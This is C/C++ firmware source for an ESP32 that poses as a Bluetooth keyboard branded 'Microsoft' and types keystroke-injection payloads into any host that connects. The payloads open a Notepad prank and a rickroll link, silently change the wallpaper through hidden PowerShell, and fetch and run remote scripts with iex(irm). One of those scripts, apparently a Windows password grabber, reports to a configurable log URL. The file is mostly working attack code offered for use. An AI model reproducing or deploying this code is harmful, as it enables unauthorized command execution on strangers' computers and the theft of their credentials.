/**
 * @file attack_payload_attack.c
 * @author SameerAlSahab (sameeralsahab54@gmail.com)
 * @brief Bluetooth payload attacks
 */

#include "bt_payload_attack.h"
#include "BleKeyboard.h"
#include "nvs_flash.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "esp_random.h"
#include "esp_system.h"
#include "esp_mac.h"
#include "nvs_flash.h"
#include "nvs.h"

static const char *TAG = "BT_PAYLOAD_ATK";

#define KB_MANUFACTURER "Microsoft"
#define KB_BATTERY      100
#define CONNECT_POLL_MS 500

static BleKeyboard      *s_keyboard  = nullptr;
static TaskHandle_t      s_task      = nullptr;
static volatile bool     s_running   = false;
static bool              s_init_done = false;
static volatile int      s_payload   = 1;
static volatile bool     s_run_now   = false;
static volatile bool     s_is_busy   = false;
static char              s_current_name[32] = {0};
static uint8_t           s_current_mac[6] = {0};


bool bt_payload_is_busy(void) { return s_is_busy; }
bool bt_payload_is_connected(void) { return (s_keyboard && s_keyboard->isConnected()); }

const char* bt_payload_get_connected_name(void) {
    if (s_keyboard && s_keyboard->isConnected()) {
        return s_current_name;
    }
    return "None";
}

const char* bt_payload_get_connected_mac(void) {
    static char mac_str[18];
    if (s_keyboard && s_keyboard->isConnected()) {
        snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                 s_current_mac[0], s_current_mac[1], s_current_mac[2],
                 s_current_mac[3], s_current_mac[4], s_current_mac[5]);
        return mac_str;
    }
    return "00:00:00:00:00:00";
}

static void generate_random_name_and_mac(void) {
    // 1. Generate a random name (e.g., y4n0-4829)
    uint16_t rand_num = (esp_random() % 9000) + 1000;
    snprintf(s_current_name, sizeof(s_current_name), "y4n0-%d", rand_num);

    // 2. Generate 6 random bytes for the MAC address (display/reporting only).
    //    NOTE: esp_base_mac_addr_set() must NOT be called here. It is only valid
    //    before the controller starts; calling it at runtime errors/aborts and
    //    was the main cause of the payload attack crashing on every start.
    //    The BLE random address is owned by NimBLE (see bt_payload_attack_start).
    for (int i = 0; i < 6; i++) {
        s_current_mac[i] = esp_random() & 0xFF;
    }

    s_current_mac[0] = (s_current_mac[0] & 0xFC) | 0x02; // locally-administered

    ESP_LOGI(TAG, "Generated random identity MAC: %02X:%02X:%02X:%02X:%02X:%02X",
             s_current_mac[0], s_current_mac[1], s_current_mac[2],
             s_current_mac[3], s_current_mac[4], s_current_mac[5]);
}

static void kb_print(const char *str) {
    while (*str) s_keyboard->write((uint8_t)*str++);
}

static void do_notepad_sequence(void) {
    vTaskDelay(pdMS_TO_TICKS(2000));
    s_keyboard->press(KEY_LEFT_GUI);
    vTaskDelay(pdMS_TO_TICKS(150));
    s_keyboard->press('r');
    vTaskDelay(pdMS_TO_TICKS(100));
    s_keyboard->release('r');
    vTaskDelay(pdMS_TO_TICKS(100));
    s_keyboard->release(KEY_LEFT_GUI);
    vTaskDelay(pdMS_TO_TICKS(1000));
    kb_print("notepad");
    vTaskDelay(pdMS_TO_TICKS(150));
    s_keyboard->write(KEY_RETURN);
    vTaskDelay(pdMS_TO_TICKS(1500));

    kb_print("You are hacked!!!!!!! jk");

    s_keyboard->write(KEY_RETURN);
}

static void do_payload_2(void) {
    const char* rick_url = "https://youtu.be/dQw4w9WgXcQ";

    s_keyboard->press(KEY_LEFT_GUI);
    vTaskDelay(pdMS_TO_TICKS(150));
    s_keyboard->press('r');
    vTaskDelay(pdMS_TO_TICKS(100));
    s_keyboard->release('r');
    vTaskDelay(pdMS_TO_TICKS(100));
    s_keyboard->release(KEY_LEFT_GUI);
    vTaskDelay(pdMS_TO_TICKS(1000));

    for (const char* p = rick_url; *p; p++) {
        s_keyboard->write((uint8_t)*p);
    }
    vTaskDelay(pdMS_TO_TICKS(150));
    s_keyboard->write(KEY_RETURN);
}

static void do_payload_3(void) {
    const char* cmd =
    "powershell -w h -c "
    "\"$p=$env:TEMP+'\\\\b.jpg';"
    "(New-Object Net.WebClient).DownloadFile('https://i.imgur.com/l3L2Op7.jpeg',$p);"
    "Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name Wallpaper -Value $p;"
    "rundll32.exe user32.dll,UpdatePerUserSystemParameters,1,True\"";

    s_keyboard->press(KEY_LEFT_GUI);
    vTaskDelay(pdMS_TO_TICKS(150));
    s_keyboard->press('r');
    vTaskDelay(pdMS_TO_TICKS(100));
    s_keyboard->release('r');
    vTaskDelay(pdMS_TO_TICKS(100));
    s_keyboard->release(KEY_LEFT_GUI);
    vTaskDelay(pdMS_TO_TICKS(800));

    kb_print(cmd);
    vTaskDelay(pdMS_TO_TICKS(300));
    s_keyboard->write(KEY_RETURN);
}

static void do_payload_5(void) {

    s_keyboard->press(KEY_LEFT_GUI);
    vTaskDelay(pdMS_TO_TICKS(150));
    s_keyboard->press('r');
    vTaskDelay(pdMS_TO_TICKS(100));
    s_keyboard->release('r');
    vTaskDelay(pdMS_TO_TICKS(100));
    s_keyboard->release(KEY_LEFT_GUI);
    vTaskDelay(pdMS_TO_TICKS(800));

    kb_print("powershell");
    vTaskDelay(pdMS_TO_TICKS(150));
    s_keyboard->write(KEY_RETURN);
    vTaskDelay(pdMS_TO_TICKS(1500));

    const char* prank_cmd = "iex (irm 'https://raw.githubusercontent.com/SameerAlSahab/ESP32-Deauther/main/payloads/win_prank.ps1')";

    kb_print(prank_cmd);

    vTaskDelay(pdMS_TO_TICKS(500));

    s_keyboard->write(KEY_RETURN);
}

static void do_payload_4(void) {

    char log_url[256] = "http://192.168.4.1/log";
    nvs_handle_t nvs;
    if (nvs_open("storage", NVS_READONLY, &nvs) == ESP_OK) {
        size_t len = sizeof(log_url);
        nvs_get_str(nvs, "log_url", log_url, &len);
        nvs_close(nvs);
    }


    s_keyboard->press(KEY_LEFT_GUI);
    vTaskDelay(pdMS_TO_TICKS(150));
    s_keyboard->press('r');
    vTaskDelay(pdMS_TO_TICKS(100));
    s_keyboard->release('r');
    vTaskDelay(pdMS_TO_TICKS(100));
    s_keyboard->release(KEY_LEFT_GUI);
    vTaskDelay(pdMS_TO_TICKS(800));


    kb_print("powershell");
    vTaskDelay(pdMS_TO_TICKS(150));
    s_keyboard->write(KEY_RETURN);
    vTaskDelay(pdMS_TO_TICKS(1200));


    char fast_cmd[1024];

    snprintf(fast_cmd, sizeof(fast_cmd),
             "$s=irm 'https://raw.githubusercontent.com/SameerAlSahab/ESP32-Deauther/main/payloads/winpass.ps1';"
             "iex ($s.Replace('http://192.168.4.1/log','%s'))",
             log_url);


    kb_print(fast_cmd);
    vTaskDelay(pdMS_TO_TICKS(500));
    s_keyboard->write(KEY_RETURN);
}

static void execute_current_payload(void) {
    if (s_is_busy) {
        ESP_LOGW(TAG, "Already busy, skipping");
        return;
    }
    s_is_busy = true;

    ESP_LOGI(TAG, "Executing Payload %d...", s_payload);

    switch (s_payload) {
        case 2: do_payload_2(); break;
        case 3: do_payload_3(); break;
        case 4: do_payload_4(); break;
        case 5: do_payload_5(); break;
        default: do_notepad_sequence(); break;
    }

    s_is_busy = false;
    ESP_LOGI(TAG, "Payload %d completed", s_payload);
}

static void keyboard_task(void *arg) {
    ESP_LOGI(TAG, "Task started - advertising as \"%s\"", s_current_name);

    /* The task must outlive a disconnect. It used to `break` when the host went
     * away, which left s_running == true with no worker behind it: the attack
     * looked alive in the UI, could not be restarted (start() bails on
     * s_running) and could not be stopped cleanly. Now we drop back to waiting
     * and let BleKeyboard re-advertise. */
    while (s_running) {
        while (s_running && !s_keyboard->isConnected()) {
            vTaskDelay(pdMS_TO_TICKS(CONNECT_POLL_MS));
        }
        if (!s_running) break;

        ESP_LOGI(TAG, "Device connected! Ready for payloads.");

        while (s_running && s_keyboard->isConnected()) {
            if (s_run_now && !s_is_busy) {
                s_run_now = false;
                execute_current_payload();
            }
            vTaskDelay(pdMS_TO_TICKS(100));
        }

        if (s_running) {
            ESP_LOGI(TAG, "Device disconnected, waiting for a new host");
        }
    }

    s_task = nullptr;
    vTaskDelete(nullptr);
}

extern "C" void bt_payload_attack_init(void) {
    if (s_init_done) {
        return;
    }

    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    s_init_done = true;
}

extern "C" void bt_payload_attack_start(int payload) {
    if (s_running) {
        return;
    }

    if (!s_init_done) bt_payload_attack_init();

    s_payload = (payload > 0) ? payload : 1;

    // Generate new name and MAC every time
    generate_random_name_and_mac();

    ble_hs_cfg.sm_io_cap = BLE_SM_IO_CAP_NO_IO;
    ble_hs_cfg.sm_bonding = 0;
    ble_hs_cfg.sm_mitm = 0;
    ble_hs_cfg.sm_sc = 0;
    ble_hs_cfg.sm_oob_data_flag = 0;


    s_keyboard = new BleKeyboard(s_current_name, KB_MANUFACTURER, KB_BATTERY, nullptr);

    // BleKeyboard::begin() spins up NimBLEDevice and starts its own connectable
    // HID advertising on a background task. Do NOT drive ble_gap_adv_* ourselves
    // here -- two owners of GAP advertising left the HID service inconsistent and
    // asserted before the host had synced. Let the library own advertising.
    s_keyboard->begin();

    s_running = true;
    s_run_now = false;
    s_is_busy = false;

    xTaskCreatePinnedToCore(keyboard_task, "bt_payload_kb", 8192, nullptr, 5, &s_task, 1);

    ESP_LOGI(TAG, "Attack started (payload=%d, name=%s)", s_payload, s_current_name);
}

extern "C" void bt_payload_attack_stop(void) {
    if (!s_running) return;

    s_running = false;

    // Wait for keyboard_task to observe s_running==false and exit on its own.
    // Force-deleting it here while it may be mid-payload (using s_keyboard) and
    // then freeing s_keyboard caused a use-after-free. Poll until it clears its
    // own handle, with a bounded timeout as a safety net.
    for (int waited = 0; s_task != nullptr && waited < 4000; waited += 50) {
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    if (s_task) {
        ESP_LOGW(TAG, "Task did not exit in time, forcing delete");
        vTaskDelete(s_task);
        s_task = nullptr;
    }

    if (s_keyboard) {
        s_keyboard->end();
        #pragma GCC diagnostic push
        #pragma GCC diagnostic ignored "-Wdelete-non-virtual-dtor"
        delete s_keyboard;
        #pragma GCC diagnostic pop
        s_keyboard = nullptr;
    }


    s_init_done = false;
    memset(s_current_name, 0, sizeof(s_current_name));

}

extern "C" void bt_payload_attack_set_payload(int payload) {
    if (payload >= 1 && payload <= 5) {
        s_payload = payload;
        ESP_LOGI(TAG, "Payload changed to %d", payload);
    }
}

extern "C" void bt_payload_attack_run_now(void) {
    if (!s_running) {
        ESP_LOGW(TAG, "Attack not running");
        return;
    }
    if (!s_keyboard || !s_keyboard->isConnected()) {
        ESP_LOGW(TAG, "No device connected");
        return;
    }
    if (s_is_busy) {
        return;
    }

    s_run_now = true;
}


